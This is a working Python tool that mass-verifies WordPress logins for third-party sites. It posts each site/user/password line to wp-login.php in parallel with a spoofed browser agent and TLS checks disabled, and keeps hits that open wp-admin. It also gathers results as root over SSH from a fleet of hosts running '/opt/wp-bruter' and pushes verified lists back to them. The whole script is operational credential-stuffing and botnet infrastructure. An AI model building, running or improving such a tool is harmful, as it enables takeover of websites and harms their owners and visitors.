#!/usr/bin/env python3
"""Verify WordPress credentials and upload the result.

Input is a .txt file with one credential per line:

    https://example.com | admin | hunter2

Separators may be " | ", "\t" or ",". Lines starting with # are ignored.

A credential counts as VERIFIED only when the login response sets a live
wordpress_logged_in_* cookie (non-empty value, expiry not in the past). Empty
or already-expired cookies are what failed logins on SiteGround-style hosts
send, so the name alone is not enough.

Results:
  <input>.verified.txt    confirmed credentials
  <input>.unverified.txt  unreachable / ambiguous, worth retrying later
Both are rewritten on every run.

Examples:
  # verify a file and write next to it
  ./verify_creds.py creds.txt

  # write to the Desktop, then hand the verified file to the fleet
  ./verify_creds.py creds.txt --desktop --upload-fleet --ssh-pass fahrel

  # collect current finds from the fleet first, verify, push back
  ./verify_creds.py --collect --ssh-pass fahrel

  # upload to an arbitrary place instead
  ./verify_creds.py creds.txt --upload user@host:/srv/creds/

The input path is a normal argument, nothing is hard-coded: point it at any
file you like now or later.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import http.cookiejar
import os
import shutil
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import ssl
from dataclasses import dataclass
from email.utils import parsedate_to_datetime

FLEET_FILE = os.environ.get(
    "FLEET_FILE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "fleet.txt")
)


def load_fleet() -> list[str]:
    """Fleet hosts: FLEET env (space/comma separated) wins, else fleet.txt."""
    raw = os.environ.get("FLEET", "")
    if raw.strip():
        hosts = [h.strip() for h in raw.replace(",", " ").split()]
    else:
        try:
            with open(FLEET_FILE, encoding="utf-8") as fh:
                hosts = [ln.split("#", 1)[0].strip() for ln in fh]
        except FileNotFoundError:
            print(f"warning: fleet file not found: {FLEET_FILE}", file=sys.stderr)
            hosts = []
    return [h for h in hosts if h]


FLEET = load_fleet()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
TEST_COOKIE = "wordpress_test_cookie=WP+Cookie+check"


@dataclass
class Cred:
    site: str
    user: str
    password: str

    def line(self) -> str:
        return f"{self.site} | {self.user} | {self.password}"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # surface the 3xx instead of following it


def opener(jar: http.cookiejar.CookieJar | None = None, follow: bool = True) -> urllib.request.OpenerDirector:
    """Redirect-following opener (unless follow is False).

    A canonical-host 301 (http -> https, apex -> www, or a migrated domain)
    used to swallow the wordpress_logged_in_* cookie on the 3xx, so the cred
    was reported invalid. Follow it and keep the session in the jar instead.

    The login POST is deliberately *not* followed: some hosts (SiteGround) set
    the logged-in cookie on the 302 and then revoke it on the bounce-back to
    /wp-login.php?reauth=1, so the verdict has to read the 302 headers.
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers: list = [urllib.request.HTTPSHandler(context=ctx)]
    if jar is not None:
        handlers.insert(0, urllib.request.HTTPCookieProcessor(jar))
    if not follow:
        handlers.append(NoRedirect)
    return urllib.request.build_opener(*handlers)


def parse_line(raw: str) -> Cred | None:
    line = raw.strip()
    if not line or line.startswith("#"):
        return None
    if "|" in line:
        parts = [p.strip() for p in line.split("|")]
    elif "\t" in line:
        parts = [p.strip() for p in line.split("\t")]
    else:
        parts = [p.strip() for p in line.split(",")]
    if len(parts) < 3:
        return None
    site, user, password = parts[0], parts[1], "|".join(parts[2:])
    if not site.startswith(("http://", "https://")):
        site = "https://" + site
    if not user or not password:
        return None
    return Cred(site.rstrip("/"), user, password)


def read_creds(path: str) -> list[Cred]:
    out: list[Cred] = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for raw in fh:
            cred = parse_line(raw)
            if cred:
                out.append(cred)
    seen, unique = set(), []
    for c in out:
        key = (c.site, c.user, c.password)
        if key not in seen:
            seen.add(key)
            unique.append(c)
    return unique


def live_auth_cookie(headers) -> bool:
    now = time.time()
    for value in headers.get_all("Set-Cookie") or []:
        name, sep, rest = value.partition("=")
        if not sep or "wordpress_logged_in_" not in name.lower():
            continue
        val = rest.split(";", 1)[0].strip()
        if val in ("", "+") or val.lower() == "deleted":
            continue
        attrs = rest.lower()
        skip = False
        if "max-age=" in attrs:
            try:
                if int(attrs.split("max-age=", 1)[1].split(";", 1)[0].strip()) <= 0:
                    skip = True
            except ValueError:
                pass
        if not skip and "expires=" in attrs:
            raw = attrs.split("expires=", 1)[1].split(";", 1)[0].strip()
            try:
                if parsedate_to_datetime(raw).timestamp() <= now:
                    skip = True
            except (TypeError, ValueError):
                pass
        if not skip:
            return True
    return False


def read_body(resp, limit: int = 200000) -> str:
    try:
        return resp.read(limit).decode("utf-8", "replace").lower()
    except (TimeoutError, OSError, ValueError):
        return ""


def jar_has_live_auth(jar: http.cookiejar.CookieJar) -> bool:
    """A session is only real with a non-empty, unexpired logged-in cookie."""
    now = time.time()
    for c in jar:
        if "wordpress_logged_in_" not in c.name.lower():
            continue
        if not c.value or c.value in ("+", "deleted"):
            continue
        if c.expires is not None and c.expires <= now:
            continue
        return True
    return False


def fetch(jar, req, timeout, follow: bool = True):
    try:
        return opener(jar, follow).open(req, timeout=timeout)
    except urllib.error.HTTPError as err:  # 3xx/4xx/5xx
        return err
    except (urllib.error.URLError, TimeoutError, OSError):
        return None


def status_of(resp) -> int:
    return getattr(resp, "status", None) or getattr(resp, "code", 0) or 0


BLOCKED = (403, 429, 500, 502, 503, 504)


def site_base(resp, fallback: str) -> str:
    url = getattr(resp, "url", None) or getattr(resp, "geturl", lambda: "")() or fallback
    parts = urllib.parse.urlparse(url)
    if parts.scheme and parts.netloc:
        return f"{parts.scheme}://{parts.netloc}"
    return fallback


def base_of_url(url: str, fallback: str) -> str:
    parts = urllib.parse.urlparse(url)
    if parts.scheme and parts.netloc:
        return f"{parts.scheme}://{parts.netloc}"
    return fallback


def verify(cred: Cred, timeout: float) -> str:
    site = cred.site

    # Canonicalise the host first: try https for an http target (a wp-admin
    # bounce to https invalidates a cookie minted over http), then follow any
    # http->https / apex->www / migration redirect.
    parts = urllib.parse.urlparse(site)
    candidates = ["https://" + parts.netloc, site] if parts.scheme == "http" else [site]
    base = None
    for cand in candidates:
        jar = http.cookiejar.CookieJar()
        get_req = urllib.request.Request(cand + "/wp-login.php", headers={"User-Agent": UA})
        get_resp = fetch(jar, get_req, timeout)
        if get_resp is None:
            continue
        code = status_of(get_resp)
        if code in BLOCKED or code >= 520:
            continue  # WAF/edge challenge or origin down, not a cred verdict
        base = site_base(get_resp, cand)
        break
    if base is None:
        return "UNKNOWN"

    def post_req_for(target: str) -> urllib.request.Request:
        data = urllib.parse.urlencode(
            {
                "log": cred.user,
                "pwd": cred.password,
                "wp-submit": "Log In",
                "testcookie": "1",
                "redirect_to": target + "/wp-admin/",
            }
        ).encode()
        req = urllib.request.Request(
            target + "/wp-login.php",
            data=data,
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": TEST_COOKIE,
            },
        )
        return req

    # Do not follow the POST: read the set-cookie on its own (3xx) response.
    post_req = post_req_for(base)
    post_resp = fetch(None, post_req, timeout, follow=False)
    if post_resp is None:
        return "UNKNOWN"

    # A cross-host / cross-scheme canonical redirect on the login endpoint: real
    # login happens on the target, so re-post there.
    for _ in range(3):
        if live_auth_cookie(post_resp.headers):
            break
        code = status_of(post_resp)
        if not (300 <= code < 400):
            break
        loc = post_resp.headers.get("Location") or ""
        if "wp-login" not in loc:
            break
        target = base_of_url(urllib.parse.urljoin(base, loc), base)
        if target == base and loc.count("wp-login") and "redirect_to=" in loc:
            break  # bounced back to the form, no point looping
        base = target
        post_req = post_req_for(base)
        post_resp = fetch(None, post_req, timeout, follow=False)
        if post_resp is None:
            return "UNKNOWN"

    if not live_auth_cookie(post_resp.headers):
        code = status_of(post_resp)
        loc = post_resp.headers.get("Location") or ""
        text = read_body(post_resp)
        if code in BLOCKED or code >= 520:
            return "UNKNOWN"
        if "captcha" in loc.lower():
            return "UNKNOWN"  # login gated behind a captcha, retry later
        if "login_error" in text or 'name="pwd"' in text:
            return "BAD"
        if not (300 <= code < 400):
            return "BAD" if text else "UNKNOWN"
        if not loc:
            return "UNKNOWN"
        # Follow the bounce and read the landing page. A failed login through a
        # custom handler (WPS Hide Login, gd-login, membership plugins) re-shows
        # its form, so a password field there is proof the cred is dead.
        land = fetch(
            None,
            urllib.request.Request(urllib.parse.urljoin(base, loc), headers={"User-Agent": UA}),
            timeout,
        )
        if land is None or status_of(land) in BLOCKED or status_of(land) >= 520:
            return "UNKNOWN"
        ltext = read_body(land)
        if "login_error" in ltext or 'name="pwd"' in ltext or "incorrect" in ltext:
            return "BAD"
        if "wp-login" in loc.lower():
            return "BAD"
        return "UNKNOWN"

    # Cookie present: confirm the session actually opens wp-admin, on the host
    # that answered the login.
    sess = http.cookiejar.CookieJar()
    sess.extract_cookies(post_resp, post_req)
    if not jar_has_live_auth(sess):
        return "BAD"  # a mangled/expired cookie would not authenticate anyway
    admin_req = urllib.request.Request(base + "/wp-admin/", headers={"User-Agent": UA})
    admin_resp = fetch(sess, admin_req, timeout)
    if admin_resp is None:
        return "UNKNOWN"
    code = status_of(admin_resp)
    loc = (admin_resp.headers.get("Location") or "").lower()
    if code in BLOCKED or code >= 520:
        return "UNKNOWN"
    if code == 404:
        return "BAD"
    if 300 <= code < 400:
        # A real session only leaves wp-admin for the front page. A bounce to a
        # custom /login/ handler (often carrying redirect_to=...wp-admin in the
        # query) is a failed login. A bounce to another /wp-admin path is fine.
        path = urllib.parse.urlparse(loc).path
        if path.startswith("/wp-admin"):
            return "OK"
        if "wp-login" in loc or any(k in loc for k in ("error=", "bc-message=", "/login/")):
            return "BAD"
        return "OK"
    body = read_body(admin_resp)
    if not body:
        return "UNKNOWN"
    if 'name="pwd"' in body:
        return "BAD"
    if 'adminmenu' in body or "wpbody-content" in body or "wpadminbar" in body:
        return "OK"
    # Minimal/headless admin shells (custom dashboard) carry none of the usual
    # markers but the live cookie already proved the session.
    return "OK" if "dashboard" in body or "/wp-admin/" in body else "UNKNOWN"


def run(creds: list[Cred], jobs: int, timeout: float, retries: int) -> dict[int, str]:
    verdicts: dict[int, str] = {}

    def one(idx: int, cred: Cred) -> None:
        verdicts[idx] = verify(cred, timeout)

    with concurrent.futures.ThreadPoolExecutor(max_workers=jobs) as pool:
        futures = [pool.submit(one, i, c) for i, c in enumerate(creds)]
        for done, fut in enumerate(concurrent.futures.as_completed(futures), 1):
            fut.result()
            if done % 25 == 0 or done == len(futures):
                print(f"\rchecked {done}/{len(futures)}", end="", file=sys.stderr, flush=True)
    print(file=sys.stderr)

    for _ in range(retries):
        unknown = [i for i, v in verdicts.items() if v == "UNKNOWN"]
        if not unknown:
            break
        print(f"retrying {len(unknown)} unknown…", file=sys.stderr)
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, jobs // 2)) as pool:
            futures = {pool.submit(verify, creds[i], timeout * 1.5): i for i in unknown}
            for fut in concurrent.futures.as_completed(futures):
                if fut.result() != "UNKNOWN":
                    verdicts[futures[fut]] = fut.result()
    return verdicts


def collect(hosts: list[str], ssh_pass: str | None, key: str | None) -> list[Cred]:
    found: list[Cred] = []
    for host in hosts:
        cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
        if key:
            cmd += ["-i", key]
        cmd += [f"root@{host}", "cat /opt/wp-bruter/creds.txt 2>/dev/null"]
        if ssh_pass:
            cmd = ["sshpass", "-p", ssh_pass] + cmd
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=90).stdout
        except (subprocess.TimeoutExpired, OSError) as err:
            print(f"collect {host}: {err}", file=sys.stderr)
            continue
        for raw in out.splitlines():
            cred = parse_line(raw)
            if cred:
                found.append(cred)
    return found


def upload(path: str, dests: list[str], ssh_pass: str | None, key: str | None) -> None:
    for dest in dests:
        if ":" not in dest:
            os.makedirs(dest, exist_ok=True)
            shutil.copy2(path, dest)
            print(f"copied → {dest}")
            continue
        cmd = ["scp", "-O", "-o", "StrictHostKeyChecking=no"]
        if key:
            cmd += ["-i", key]
        cmd += [path, dest]
        if ssh_pass:
            cmd = ["sshpass", "-p", ssh_pass] + cmd
        try:
            subprocess.run(cmd, check=True, timeout=120)
            print(f"uploaded → {dest}")
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, OSError) as err:
            print(f"upload {dest}: {err}", file=sys.stderr)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Verify WordPress credentials and upload the verified list.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    ap.add_argument("input", nargs="?", help="credential .txt file")
    ap.add_argument("-o", "--output", help="verified output (default <input>.verified.txt)")
    ap.add_argument("--desktop", action="store_true", help="write outputs to ~/Desktop")
    ap.add_argument("--collect", action="store_true", help="gather creds.txt from the fleet first")
    ap.add_argument("--jobs", type=int, default=20, help="parallel checks (default 20)")
    ap.add_argument("--timeout", type=float, default=15.0, help="per-request timeout (default 15s)")
    ap.add_argument("--retries", type=int, default=2, help="retry rounds for unknowns (default 2)")
    ap.add_argument("--upload", action="append", default=[], metavar="DEST",
                    help="scp destination (user@host:/dir or a local dir); repeatable")
    ap.add_argument("--upload-fleet", action="store_true",
                    help="upload the verified file to all known workers")
    ap.add_argument("--upload-what", choices=["verified", "input"], default="verified")
    ap.add_argument("--ssh-pass", help="password for collect/upload (uses sshpass)")
    ap.add_argument("--ssh-key", help="ssh key for collect/upload")
    args = ap.parse_args()

    if args.collect:
        if not args.input:
            stamp = time.strftime("%Y%m%d-%H%M%S")
            args.input = os.path.join(
                os.path.expanduser("~/Desktop"), f"wp-collected-{stamp}.txt"
            )
        creds = collect(FLEET, args.ssh_pass, args.ssh_key)
        with open(args.input, "w", encoding="utf-8") as fh:
            fh.write("# collected from the fleet\n")
            fh.writelines(c.line() + "\n" for c in creds)
        print(f"collected {len(creds)} creds → {args.input}")
        if not args.input:
            return 0

    if not args.input:
        ap.error("give an input file or --collect")
    if not os.path.exists(args.input):
        ap.error(f"no such file: {args.input}")

    creds = read_creds(args.input)
    if not creds:
        print("no credentials parsed", file=sys.stderr)
        return 1

    base = os.path.splitext(args.input)[0]
    outdir = os.path.expanduser("~/Desktop") if args.desktop else os.path.dirname(args.input)
    verified_path = args.output or os.path.join(outdir, f"{os.path.basename(base)}.verified.txt")
    unknown_path = os.path.join(outdir, f"{os.path.basename(base)}.unverified.txt")

    print(f"verifying {len(creds)} credentials with {args.jobs} workers…", file=sys.stderr)
    started = time.time()
    verdicts = run(creds, args.jobs, args.timeout, args.retries)

    ok = [creds[i] for i, v in verdicts.items() if v == "OK"]
    unknown = [creds[i] for i, v in verdicts.items() if v == "UNKNOWN"]
    bad = len(creds) - len(ok) - len(unknown)

    with open(verified_path, "w", encoding="utf-8") as fh:
        fh.write(f"# verified {time.strftime('%F %T')} — live logged-in cookie required\n")
        fh.write("# site | user | pass\n")
        fh.writelines(c.line() + "\n" for c in sorted(ok, key=lambda c: c.site))
    with open(unknown_path, "w", encoding="utf-8") as fh:
        fh.write("# unverified: unreachable or ambiguous at check time\n")
        fh.write("# site | user | pass\n")
        fh.writelines(c.line() + "\n" for c in sorted(unknown, key=lambda c: c.site))

    print(
        f"done in {time.time() - started:.0f}s — "
        f"verified {len(ok)}, invalid {bad}, unknown {len(unknown)}\n"
        f"  {verified_path}\n  {unknown_path}"
    )

    dests = list(args.upload)
    if args.upload_fleet:
        dests += [f"root@{h}:/opt/wp-bruter/" for h in FLEET]
    if dests:
        target = args.input if args.upload_what == "input" else verified_path
        upload(target, dests, args.ssh_pass, args.ssh_key)
    return 0


if __name__ == "__main__":
    sys.exit(main())
